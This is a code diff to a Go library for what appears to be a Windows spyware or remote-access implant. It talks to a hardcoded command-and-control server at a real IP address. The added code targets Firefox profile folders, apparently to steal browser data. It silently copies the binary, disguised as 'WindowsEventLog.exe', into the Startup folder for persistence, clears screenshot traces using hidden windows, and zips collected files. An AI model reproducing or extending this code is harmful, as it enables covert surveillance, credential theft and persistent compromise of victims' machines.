@@ -1,6 +1,7 @@
 package lib
 
 import (
+	"archive/zip"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -25,7 +26,7 @@ import (
 	"time"
 )
 
-const VERSION string = "3"
+const VERSION string = "4"
 const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://111.231.82.173/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
@@ -33,12 +34,16 @@ const MIDETCD string = "111.231.82.173:2379"
 const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
 const ALLKILL string = "http://111.231.82.173:9000/Allkill"
 const GETSCREEN string = "http://111.231.82.173:9000/getpic"
+const CLEARPIC = "http://111.231.82.173:9000/clearpic"
 const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
 const NOGUILOG = "C:\\Windows\\Temp\\nogui.txt"
 
 var HOSTID = machineinfo.GetSystemVersion().Hostid
 var BrowserSafepath = get_current_user() + "\\tmp\\"
+var Firefox = get_current_user() + "\\fire\\"
+var Firefoxpath = get_current_user() + "\\appdata\\Roaming\\Mozilla\\Firefox\\Profiles"
+var AUTOSTART = get_current_user() + "\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 var OUTIP string
 
 type Msg struct {
@@ -87,6 +92,12 @@ func DoUpdate() {
 		}
 		<-ticker.C
 	}
+}
+
+func ClearPic() {
+	cmd := exec.Command("cmd", "/C", "del", CURRENTPATH+".png")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
 }
 func SingleFile(file string, addr string, finflag chan string) {
 	pbuf := new(bytes.Buffer)
@@ -162,6 +173,13 @@ func KillMain() {
 	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
 	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	killcheck.Run()
+}
+func AutoStart() {
+	time.Sleep(6 * time.Second)
+	move := exec.Command("cmd", "/C", "copy", CURRENTPATH+"WindowsEventLog.exe", AUTOSTART+"WindowsEventLog.exe")
+	move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	// not Start will continue
+	move.Run()
 }
 func MultiFileDown(files []string, step string) {
 	if len(files) == 0 && step == "init" {
@@ -261,6 +279,61 @@ func Getscreenshot() []string {
 		png.Encode(file, img)
 	}
 	return filenames
+}
+
+func Compress(files []*os.File, dest string) error {
+	d, _ := os.Create(dest)
+	defer d.Close()
+	w := zip.NewWriter(d)
+	defer w.Close()
+	for _, file := range files {
+		// need to target dir exits first
+		err := compress(file, "", w)
+		if err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+func compress(file *os.File, prefix string, zw *zip.Writer) error {
+	info, err := file.Stat()
+	if err != nil {
+		return err
+	}
+	if info.IsDir() {
+		prefix = prefix + "/" + info.Name()
+		fileInfos, err := file.Readdir(-1)
+		if err != nil {
+			return err
+		}
+		for _, fi := range fileInfos {
+			f, err := os.Open(file.Name() + "/" + fi.Name())
+			if err != nil {
+				return err
+			}
+			err = compress(f, prefix, zw)
+			if err != nil {
+				return err
+			}
+		}
+	} else {
+		header, err := zip.FileInfoHeader(info)
+		header.Name = prefix + "/" + header.Name
+		if err != nil {
+			return err
+		}
+		writer, err := zw.CreateHeader(header)
+		if err != nil {
+			return err
+		}
+		_, err = io.Copy(writer, file)
+		file.Close()
+		if err != nil {
+			return err
+		}
+	}
+	return nil
 }
 
 //func SystemCheck(){
